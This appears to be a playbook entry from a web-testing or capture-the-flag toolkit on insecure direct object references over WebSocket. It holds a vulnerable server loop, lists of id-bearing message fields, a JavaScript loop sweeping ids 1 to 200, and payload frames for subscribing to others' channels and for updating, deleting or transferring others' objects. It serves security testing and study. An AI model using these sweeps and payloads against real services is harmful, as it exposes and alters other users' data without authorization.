# Message-IDOR (deep) — the per-frame object gap, complete

## The mechanism

```python
async for msg in websocket:
    obj = await store.get(msg['id'])          # the handshake's user is NOT
    await websocket.send(obj.json())           # re-checked against the id
```

`store.get(msg['id'])` with no `obj.owner == user` — the IDOR.

## The id-field taxonomy — every name that carries an object

```json
{"action":"read","id":"<x>"}        {"action":"get","user_id":<n>}
{"action":"open","doc":"<x>"}       {"action":"load","document":"<x>"}
{"action":"history","room":"<x>"}   {"action":"join","channel":"<x>"}
{"action":"subscribe","topic":"<x>"}{"action":"read","conversation":"<x>"}
{"action":"view","account":"<x>"}   {"action":"list","org":"<x>"}
{"action":"export","object":"<x>"}  {"action":"fetch","item":"<x>"}
```

`id`/`user_id`/`uid`/`doc`/`document`/`room`/`channel`/`conversation`/
`topic`/`account`/`org`/`tenant`/`object`/`item`/`record`/`resource`/
`project`/`file`/`note`/`message`/`thread`/`ticket`/`order`/`invoice`.

## The id-space — enumerable or not

- sequential numeric `id`/`room`/`doc` — a `1..N` sweep maps all objects
- a username/slug `id` — the enum'd names from `web-user-enum`
- a uuid/`ObjectId` — non-enumerable but a `200`-vs-error oracle on a
  KNOWN id still fires (grab one from the bundle/your own object)
- a `me`/`self`/`current` alias — `id:"me"` vs `id:"<name>"` — the
  differential between the alias and the literal

## The sweep — one field per connection

```javascript
// the id-space sweep — a fresh logical step per id
for (let id=1; id<=200; id++) ws.send(JSON.stringify({action:"read",id}));
// or per-connection — the cleaner one-object-per-frame attribution
```

Every frame returning another's object = a message-IDOR; the sweep is
the namespace enumeration + the read — `web-idor`'s twin over WS.

## The membership/subscribe-IDOR

```json
{"action":"subscribe","channel":"user-admin"}
{"action":"join","room":"secret-room"}
{"action":"watch","doc":"admin-doc"}
{"action":"subscribe","channel":"internal-feed"}
{"action":"listen","topic":"/user/<other>/events"}
```

A `subscribe`/`join`/`watch`/`listen`/`follow` to a channel the
subscriber should not reach — the frames that arrive are the data read.

## The composite read — the object's flag field

```
{"action":"read","id":"admin"} -> {"id":"admin","email":"...","flag":"..."}
```

The admin object's private field — a `flag`/`secret`/`token`/`key` —
the IDOR reads it; the flag is in the object.

## The write-side IDOR

```json
{"action":"update","id":"<other>","field":"x"}  -> write another's object
{"action":"delete","id":"<other>"}             -> delete another's object
{"action":"transfer","from":"<other>","to":"me"} -> move another's asset
```

A write-side IDOR is the impact — confirm by a second read; never a
destructive write on a shared object.

## The IDOR verdict + record

`oracle: message:<field>: the reply carries another's object` — the
verbatim `{"id":"victim",...}` + the baseline own-`id` control.
